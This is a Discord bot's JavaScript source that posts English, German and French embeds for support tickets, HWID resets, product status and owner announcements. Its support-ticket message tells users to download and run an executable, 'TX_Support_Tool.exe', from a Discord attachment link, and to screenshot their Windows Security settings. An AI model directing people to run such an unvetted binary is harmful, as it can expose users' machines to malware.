const { Client, GatewayIntentBits, EmbedBuilder, SlashCommandBuilder, REST, Routes, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

const prefix = '.';
const DEV_LOG_CHANNEL_ID = '1414044553312468992';
const OWNER_ID = '1017206528928923648';
const ANNOUNCEMENT_CHANNEL_ID = '1414421793393082461';
const pendingAnnouncements = new Map();

const commands = [
    new SlashCommandBuilder().setName('allcmds').setDescription('Display all available bot commands (Staff Quick Reference)'),
    new SlashCommandBuilder().setName('announcement').setDescription('Create announcement (Owner Only)')
        .addStringOption(option => option.setName('title_en').setDescription('Title in English').setRequired(true))
        .addStringOption(option => option.setName('description_en').setDescription('Description in English').setRequired(true))
        .addStringOption(option => option.setName('title_de').setDescription('Title in German').setRequired(true))
        .addStringOption(option => option.setName('description_de').setDescription('Description in German').setRequired(true))
        .addStringOption(option => option.setName('title_fr').setDescription('Title in French').setRequired(true))
        .addStringOption(option => option.setName('description_fr').setDescription('Description in French').setRequired(true))
];

const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
async function registerCommands() {
    await rest.put(Routes.applicationCommands(process.env.CLIENT_ID), { body: commands });
    console.log('Commands registered successfully.');
}
registerCommands().catch(console.error);

client.once('ready', () => {
    console.log(`Bot is ready! Logged in as ${client.user.tag}`);
    client.user.setPresence({ activities: [{ name: 'Doing things others cant.', type: 4 }], status: 'online' });
});

function createTranslationButtons() {
    return new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('translate_en').setLabel('English').setStyle(ButtonStyle.Secondary).setEmoji('🇺🇸'),
        new ButtonBuilder().setCustomId('translate_de').setLabel('Deutsch').setStyle(ButtonStyle.Secondary).setEmoji('🇩🇪'),
        new ButtonBuilder().setCustomId('translate_fr').setLabel('Français').setStyle(ButtonStyle.Secondary).setEmoji('🇫🇷')
    );
}

function createConfirmationButtons(announcementId) {
    return new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`confirm_${announcementId}`).setLabel('Confirm & Send').setStyle(ButtonStyle.Success).setEmoji('✅'),
        new ButtonBuilder().setCustomId(`cancel_${announcementId}`).setLabel('Cancel').setStyle(ButtonStyle.Danger).setEmoji('❌')
    );
}

function createAnnouncement(data, language = 'en') {
    const embed = new EmbedBuilder().setColor('#245CD9').setTimestamp().setImage('https://cdn.discordapp.com/attachments/1384365774369722409/1393154694896943184/embed.png');
    if (language === 'en') embed.setTitle(data.title_en).setDescription(data.description_en);
    else if (language === 'de') embed.setTitle(data.title_de).setDescription(data.description_de);
    else if (language === 'fr') embed.setTitle(data.title_fr).setDescription(data.description_fr);
    return embed;
}

function createSupportTicket(language = 'en') {
    const embed = new EmbedBuilder().setColor('#245CD9').setTimestamp().setImage('https://cdn.discordapp.com/attachments/1384365774369722409/1393154694896943184/embed.png');
    if (language === 'en') {
        embed.setTitle('📋 Support Ticket Requirements').setDescription('In order to assist you efficiently, please ensure you provide the following when opening a ticket:')
            .addFields(
                { name: '📹 Required Information', value: '• A clear, high-quality video demonstrating the issue\n• A screenshot of the error message(s)\n• The name of the product you are using\n• The version of Windows you are running\n• A screenshot of each tab within your Windows Security settings' },
                { name: '🔧 Diagnostic Tool', value: 'Run the following diagnostic setup file and provide a screenshot when prompted:\n[TX Support Tool](https://cdn.discordapp.com/attachments/1413199327249170472/1418206411178901558/TX_Support_Tool.exe)' },
                { name: '⚠️ Important Notes', value: '• Failure to follow these steps may result in delays or prevent us from providing effective support\n• Please ensure all requested information is submitted promptly\n• Once everything is submitted, kindly wait for an administrator to respond\n• Inactivity within the ticket may result in it being automatically closed' }
            ).setFooter({ text: 'Support Team • Please follow all requirements' });
    } else if (language === 'de') {
        embed.setTitle('📋 Support-Ticket Anforderungen').setDescription('Um Ihnen effizient zu helfen, stellen Sie bitte beim Öffnen eines Tickets die folgenden Informationen bereit:')
            .addFields(
                { name: '📹 Erforderliche Informationen', value: '• Ein klares, hochwertiges Video, das das Problem demonstriert\n• Ein Screenshot der Fehlermeldung(en)\n• Der Name des Produkts, das Sie verwenden\n• Die Version von Windows, die Sie verwenden\n• Ein Screenshot jedes Tabs in Ihren Windows-Sicherheitseinstellungen' },
                { name: '🔧 Diagnose-Tool', value: 'Führen Sie die folgende Diagnose-Datei aus und stellen Sie einen Screenshot bereit:\n[TX Support Tool](https://cdn.discordapp.com/attachments/1413199327249170472/1418206411178901558/TX_Support_Tool.exe)' },
                { name: '⚠️ Wichtige Hinweise', value: '• Das Nichtbefolgen dieser Schritte kann zu Verzögerungen führen oder uns daran hindern, effektiven Support zu bieten\n• Bitte stellen Sie sicher, dass alle angeforderten Informationen umgehend übermittelt werden\n• Warten Sie nach der Übermittlung geduldig auf die Antwort eines Administrators\n• Inaktivität im Ticket kann zur automatischen Schließung führen' }
            ).setFooter({ text: 'Support Team • Bitte befolgen Sie alle Anforderungen' });
    } else if (language === 'fr') {
        embed.setTitle('📋 Exigences du Ticket de Support').setDescription('Afin de vous aider efficacement, veuillez vous assurer de fournir les éléments suivants lors de l\'ouverture d\'un ticket:')
            .addFields(
                { name: '📹 Informations Requises', value: '• Une vidéo claire et de haute qualité démontrant le problème\n• Une capture d\'écran du/des message(s) d\'erreur\n• Le nom du produit que vous utilisez\n• La version de Windows que vous utilisez\n• Une capture d\'écran de chaque onglet dans vos paramètres de sécurité Windows' },
                { name: '🔧 Outil de Diagnostic', value: 'Exécutez le fichier de configuration de diagnostic suivant et fournissez une capture d\'écran:\n[TX Support Tool](https://cdn.discordapp.com/attachments/1413199327249170472/1418206411178901558/TX_Support_Tool.exe)' },
                { name: '⚠️ Notes Importantes', value: '• Ne pas suivre ces étapes peut entraîner des retards ou nous empêcher de fournir un support efficace\n• Veuillez vous assurer que toutes les informations demandées sont soumises rapidement\n• Une fois tout soumis, veuillez attendre patiemment qu\'un administrateur réponde\n• L\'inactivité dans le ticket peut entraîner sa fermeture automatique' }
            ).setFooter({ text: 'Équipe de Support • Veuillez suivre toutes les exigences' });
    }
    return embed;
}

function createHwidReset(language = 'en') {
    const embed = new EmbedBuilder().setColor('#245CD9').setTimestamp().setImage('https://cdn.discordapp.com/attachments/1384365774369722409/1393154694896943184/embed.png');
    if (language === 'en') {
        embed.setTitle('🔄 HWID Reset Requirements').setDescription('To assist you with your HWID reset request, please provide the following information:')
            .addFields(
                { name: '📄 Required Documents', value: '• A clear and detailed image of your invoice ID\n• A screenshot or photo of your payment confirmation\n• The email associated with your key\n• The reason you are requesting a reset' },
                { name: '⏳ Processing Time', value: 'Once all required information has been submitted, kindly allow some time for our team to review and respond accordingly.' }
            ).setFooter({ text: 'HWID Reset Team • All information is required' });
    } else if (language === 'de') {
        embed.setTitle('🔄 HWID-Reset Anforderungen').setDescription('Um Ihnen bei Ihrer HWID-Reset-Anfrage zu helfen, stellen Sie bitte die folgenden Informationen bereit:')
            .addFields(
                { name: '📄 Erforderliche Dokumente', value: '• Ein klares und detailliertes Bild Ihrer Rechnungs-ID\n• Ein Screenshot oder Foto Ihrer Zahlungsbestätigung\n• Die E-Mail, die mit Ihrem Schlüssel verknüpft ist\n• Der Grund für Ihre Reset-Anfrage' },
                { name: '⏳ Bearbeitungszeit', value: 'Sobald alle erforderlichen Informationen übermittelt wurden, gewähren Sie unserem Team bitte etwas Zeit zur Überprüfung und entsprechenden Antwort.' }
            ).setFooter({ text: 'HWID-Reset Team • Alle Informationen sind erforderlich' });
    } else if (language === 'fr') {
        embed.setTitle('🔄 Exigences de Réinitialisation HWID').setDescription('Pour vous aider avec votre demande de réinitialisation HWID, veuillez fournir les informations suivantes:')
            .addFields(
                { name: '📄 Documents Requis', value: '• Une image claire et détaillée de votre ID de facture\n• Une capture d\'écran ou photo de votre confirmation de paiement\n• L\'e-mail associé à votre clé\n• La raison pour laquelle vous demandez une réinitialisation' },
                { name: '⏳ Temps de Traitement', value: 'Une fois que toutes les informations requises ont été soumises, veuillez accorder du temps à notre équipe pour examiner et répondre en conséquence.' }
            ).setFooter({ text: 'Équipe de Réinitialisation HWID • Toutes les informations sont requises' });
    }
    return embed;
}

function createStatus(language = 'en') {
    const embed = new EmbedBuilder().setColor('#245CD9').setTimestamp().setImage('https://cdn.discordapp.com/attachments/1384365774369722409/1393154694896943184/embed.png');
    if (language === 'en') {
        embed.setTitle('📊 Product Status').setDescription('Check the current status of all our products and services.')
            .addFields(
                { name: '🔗 Status Page', value: '[View Live Status](https://dottyservices.online/status)\nMonitor real-time status updates for all products' },
                { name: '⚠️ Important Notice', value: 'Always check the status page before using any products to ensure optimal performance and avoid potential issues.' }
            ).setFooter({ text: 'Status Team • Always check before use' });
    } else if (language === 'de') {
        embed.setTitle('📊 Produktstatus').setDescription('Überprüfen Sie den aktuellen Status aller unserer Produkte und Dienstleistungen.')
            .addFields(
                { name: '🔗 Status-Seite', value: '[Live-Status anzeigen](https://dottyservices.online/status)\nÜberwachen Sie Echtzeit-Status-Updates für alle Produkte' },
                { name: '⚠️ Wichtiger Hinweis', value: 'Überprüfen Sie immer die Status-Seite vor der Verwendung von Produkten, um optimale Leistung zu gewährleisten und potenzielle Probleme zu vermeiden.' }
            ).setFooter({ text: 'Status Team • Immer vor Gebrauch prüfen' });
    } else if (language === 'fr') {
        embed.setTitle('📊 Statut des Produits').setDescription('Vérifiez le statut actuel de tous nos produits et services.')
            .addFields(
                { name: '🔗 Page de Statut', value: '[Voir le Statut en Direct](https://dottyservices.online/status)\nSurveiller les mises à jour de statut en temps réel pour tous les produits' },
                { name: '⚠️ Avis Important', value: 'Vérifiez toujours la page de statut avant d\'utiliser des produits pour assurer des performances optimales et éviter des problèmes potentiels.' }
            ).setFooter({ text: 'Équipe de Statut • Toujours vérifier avant utilisation' });
    }
    return embed;
}

function getEmbedForCommand(commandType, language) {
    if (commandType === 'supportticket') return createSupportTicket(language);
    if (commandType === 'hwidreset') return createHwidReset(language);
    if (commandType === 'status') return createStatus(language);
    return null;
}

async function logCommand(user, command) {
    const devChannel = client.channels.cache.get(DEV_LOG_CHANNEL_ID);
    if (devChannel) {
        const embed = new EmbedBuilder().setColor('#4ECDC4').setTitle('📊 Command Used')
            .addFields({ name: '👤 User', value: user.username, inline: true }, { name: '⚡ Command', value: `.${command}`, inline: true }).setTimestamp();
        devChannel.send({ embeds: [embed] }).catch(() => {});
    }
}

async function logTranslation(user, language, command) {
    const devChannel = client.channels.cache.get(DEV_LOG_CHANNEL_ID);
    if (devChannel) {
        const embed = new EmbedBuilder().setColor('#FFE66D').setTitle('🌍 Translation Sent')
            .addFields({ name: '👤 User', value: user.username, inline: true }, { name: '🔤 Language', value: language, inline: true }, { name: '📨 Sent To DM', value: user.username, inline: true }).setTimestamp();
        devChannel.send({ embeds: [embed] }).catch(() => {});
    }
}

client.on('interactionCreate', async (interaction) => {
    if (interaction.isChatInputCommand()) {
        if (interaction.commandName === 'allcmds') {
            const embed = new EmbedBuilder().setColor('#245CD9').setTitle('🤖 All Bot Commands').setDescription('Available commands with DM translations.')
                .addFields({ name: '📋 Commands', value: '`.supportticket` - Support requirements\n`.hwidreset` - HWID reset requirements\n`.status` - Product status' }).setTimestamp()
                .setImage('https://cdn.discordapp.com/attachments/1384365774369722409/1393154694896943184/embed.png');
            await interaction.reply({ embeds: [embed], ephemeral: true }).catch(() => {});
        }

        if (interaction.commandName === 'announcement') {
            if (interaction.user.id !== OWNER_ID) {
                await interaction.reply({ content: 'Permission denied.', ephemeral: true }).catch(() => {});
                return;
            }
            const data = {
                title_en: interaction.options.getString('title_en'),
                description_en: interaction.options.getString('description_en'),
                title_de: interaction.options.getString('title_de'),
                description_de: interaction.options.getString('description_de'),
                title_fr: interaction.options.getString('title_fr'),
                description_fr: interaction.options.getString('description_fr')
            };
            const id = Date.now().toString();
            pendingAnnouncements.set(id, data);
            const embed = createAnnouncement(data, 'en');
            await interaction.reply({
                content: '📋 **Preview** (No ping)',
                embeds: [embed],
                components: [createTranslationButtons(), createConfirmationButtons(id)]
            }).catch(() => {});
        }
    }

    if (interaction.isButton()) {
        if (interaction.customId.startsWith('translate_')) {
            const language = interaction.customId.split('_')[1];
            await interaction.reply({ content: 'Check your DMs for the translation!', ephemeral: true }).catch(() => {});

            let embedToSend = null;
            let commandType = 'announcement';

            if (interaction.message.content && interaction.message.content.includes('Preview')) {
                for (const [id, data] of pendingAnnouncements.entries()) {
                    embedToSend = createAnnouncement(data, language);
                    break;
                }
            } else {
                const title = interaction.message.embeds[0].title;
                if (title.includes('Support')) commandType = 'supportticket';
                else if (title.includes('HWID')) commandType = 'hwidreset';
                else if (title.includes('Status')) commandType = 'status';
                embedToSend = getEmbedForCommand(commandType, language);
            }

            if (embedToSend) {
                try {
                    await interaction.user.send({ embeds: [embedToSend] });
                    logTranslation(interaction.user, language, commandType);
                } catch (error) {
                    console.log('DM failed');
                }
            }
        }

        if (interaction.customId.startsWith('confirm_')) {
            if (interaction.user.id !== OWNER_ID) return;
            const id = interaction.customId.split('_')[1];
            const data = pendingAnnouncements.get(id);
            if (data) {
                const channel = client.channels.cache.get(ANNOUNCEMENT_CHANNEL_ID);
                if (channel) {
                    await channel.send({ content: '@everyone', embeds: [createAnnouncement(data, 'en')], components: [createTranslationButtons()] }).catch(() => {});
                    await interaction.update({ content: '✅ Sent!', embeds: [], components: [] }).catch(() => {});
                    pendingAnnouncements.delete(id);
                }
            }
        }

        if (interaction.customId.startsWith('cancel_')) {
            if (interaction.user.id !== OWNER_ID) return;
            const id = interaction.customId.split('_')[1];
            pendingAnnouncements.delete(id);
            await interaction.update({ content: '❌ Cancelled', embeds: [], components: [] }).catch(() => {});
        }
    }
});

client.on('messageCreate', async (message) => {
    if (!message.content.startsWith(prefix) || message.author.bot) return;
    const command = message.content.slice(prefix.length).trim().toLowerCase();
    const validCommands = ['supportticket', 'hwidreset', 'status'];

    if (validCommands.includes(command)) {
        const embed = getEmbedForCommand(command, 'en');
        const buttons = createTranslationButtons();
        await message.delete().catch(() => {});
        await message.channel.send({ embeds: [embed], components: [buttons] }).catch(() => {});
        logCommand(message.author, command);
    }
});

client.login(process.env.DISCORD_TOKEN);
